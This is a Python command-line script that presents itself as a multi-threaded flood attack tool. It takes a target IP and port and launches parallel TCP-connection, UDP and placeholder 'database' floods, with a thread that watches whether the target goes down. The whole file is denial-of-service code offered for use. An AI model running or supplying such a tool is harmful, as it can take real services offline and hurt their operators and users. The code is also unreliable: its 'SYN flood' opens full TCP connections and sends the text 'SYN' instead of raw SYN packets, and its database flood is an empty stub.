import argparse
import socket
import threading
import time

def syn_flood(ip, port, packet_count):
    for _ in range(packet_count):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                s.send(b'SYN')
                print("[*] SYN packet sent to", ip)
        except socket.error:
            print("[!] Target", ip, "is unreachable.")
            break

def udp_flood(ip, port, packet_count):
    for _ in range(packet_count):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(b'UDP', (ip, port))
                print("[*] UDP packet sent to", ip)
        except socket.error:
            print("[!] Target", ip, "is unreachable.")
            break

def database_flood(ip, port, packet_count):
    for _ in range(packet_count):
        try:
            # Implement database flood logic here (e.g., sending SQL queries)
            print("[*] Database query sent to", ip)
        except Exception as e:
            print("[!] Error:", e)
            break

def check_target(ip, port):
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((ip, port))
                print("[*] Target", ip, "is reachable.")
        except socket.error:
            print("[!] Target", ip, "is unreachable.")
        time.sleep(5)  # Check every 5 seconds

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Threaded Flood Attack with Target Monitoring")
    parser.add_argument("-i", "--ip", required=True, type=str, help="Target IP")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port")
    parser.add_argument("-c", "--count", type=int, default=50000, help="Number of packets to send per attack")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads per attack")
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    packet_count = args.count
    threads = args.threads

    print("[*] Starting flood attacks on", ip, "port", port)
    print("[*] Sending", packet_count, "packets per attack per thread")
    print("[*] Using", threads, "threads per attack")

    # Start the target monitoring thread
    monitor_thread = threading.Thread(target=check_target, args=(ip, port))
    monitor_thread.daemon = True
    monitor_thread.start()

    # Start flood attack threads
    syn_threads = []
    udp_threads = []
    db_threads = []
    for _ in range(threads):
        syn_thread = threading.Thread(target=syn_flood, args=(ip, port, packet_count))
        syn_threads.append(syn_thread)
        syn_thread.start()

        udp_thread = threading.Thread(target=udp_flood, args=(ip, port, packet_count))
        udp_threads.append(udp_thread)
        udp_thread.start()

        db_thread = threading.Thread(target=database_flood, args=(ip, port, packet_count))
        db_threads.append(db_thread)
        db_thread.start()

    # Wait for all threads to complete
    for syn_thread in syn_threads:
        syn_thread.join()
    for udp_thread in udp_threads:
        udp_thread.join()
    for db_thread in db_threads:
        db_thread.join()

    print("[*] Flood attacks completed")
